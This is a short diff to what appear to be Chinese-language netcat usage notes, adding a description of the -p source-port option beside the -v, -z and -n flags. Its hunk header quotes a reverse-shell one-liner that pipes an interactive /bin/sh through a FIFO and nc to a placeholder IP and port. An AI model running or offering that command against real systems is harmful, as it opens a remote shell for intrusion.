@@ -14,6 +14,8 @@ cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc <local_ip> <local_port> > /tmp/tmp_fifo
 
 <ip> <port>   连接端口
 
+-p 指定源端口（避免使用随机端口）
+
 -v 显示详细输出
 -z 连接成功后立即关闭连接，不等待数据交换
 -n 不要使用DNS反向查询
